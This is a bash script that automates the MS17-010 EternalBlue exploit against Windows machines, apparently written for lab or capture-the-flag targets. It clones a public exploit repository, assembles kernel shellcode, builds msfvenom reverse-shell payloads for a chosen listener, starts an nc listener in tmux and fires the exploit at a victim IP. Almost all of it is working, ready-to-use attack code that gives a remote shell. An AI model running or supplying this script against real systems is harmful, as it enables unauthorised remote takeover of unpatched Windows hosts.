#!/bin/bash
man_help () {
cat <<eof

# MS17-010 Eternal-Blue Without Namepipes using ASM Assembly code #

/!\ NOTE; (must be run with a tmux session and have nc installed)

        -l <lhost-ip>     || LHOST from the attacker's listener.
        -p <lport-number> || LPORT from the attacker's listener.
        -r <rhost-ip>     || RHOST IP Addr of the victim machine.
	-m <method>
		all || Download Files and Preform the attack
		new || Delete old payload and Create a new msfvenom payload without downloading the ASM files
		run || Attack With the previously compiled msfvenom payload

	chmod +x blue.sh
        ./blue.sh -l 10.10.16.2 -p 8900 -r 10.10.10.80 -m all
	./blue.sh -l 10.2.12.12 -p 9001 -r 10.10.24.61 -m new

		* will fail with  listener is already in use somewhere else

	./blue.sh -m run -r 10.10.24.61 -p 1234
	./blue.sh -m run -r 10.10.24.61
eof
exit 1
}
if [ -z "$1" ]; then
        man_help
elif [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
        man_help
else
while getopts l:p:r:m: opts
do
        case "${opts}" in
        l) l_host=${OPTARG};;
        p) l_port=${OPTARG};;
        r) r_host=${OPTARG};;
	m) method=${OPTARG};;
esac
done
fi
#-----------------------------------------------------------------------------------------------------------------------------------
if [ "$method" == "all" ]; then
# create listener in the current tmux window
export heylisten=$l_port
tmux split-window -h nc -lvnp $heylisten

# grab code from github
git clone https://github.com/worawit/MS17-010.git
# fixed python3 versions or just use python2
#https://github.com/OreoByte/MS17-010.git

#compile for 64bit windows + payload creation
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
msfvenom -p windows/x64/shell_reverse_tcp LPORT=$l_port LHOST=$l_host --platform windows -a x64 --format raw -o sc_x64_payload.bin
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin

#compile for 32bit windows + payload creation
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
msfvenom -p windows/shell_reverse_tcp LPORT=$l_port LHOST=$l_host --platform windows -a x86 --format raw -o sc_x86_payload.bin
cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin

# fuse binaries together
python2 MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin

# run exploit
python2 MS17-010/eternalblue_exploit7.py $r_host sc_all.bin

#------------------------------------------------------------------------------------------------------------------------------------
elif [ "$method" == "new" ]; then
# create listener in the current tmux window
export heylisten=$l_port
tmux split-window -h nc -lvnp $heylisten

# remove old payload
rm ./sc*

# compile for 64bit windows + payload creation (without-download)
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
msfvenom -p windows/x64/shell_reverse_tcp LPORT=$l_port LHOST=$l_host --platform windows -a x64 --format raw -o sc_x64_payload.bin
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin

# compile for 32bit windows + payload creation (without-download)
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
msfvenom -p windows/shell_reverse_tcp LPORT=$l_port LHOST=$l_host --platform windows -a x86 --format raw -o sc_x86_payload.bin
cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin

# fuse binaries together (without-download)
python2 MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin

# run exploit (without-download)
python2 MS17-010/eternalblue_exploit7.py $r_host sc_all.bin
#---------------------------------------------------------------------------------------------------------------------------------
elif [ "$method" == "run" ]; then

# if nc listener is already setup somewhere
if [ -z "$l_port" ]; then
python2 MS17-010/eternalblue_exploit7.py $r_host sc_all.bin

# run exec with a newly setup nc listenr in the current tmux window
else

export heylisten=$l_port
tmux split-window -h nc -lvnp $heylisten

python2 MS17-010/eternalblue_exploit7.py $r_host sc_all.bin
fi

else
echo -e "\n[X] Error. Incorrect Options or Required software NOT installed"
fi
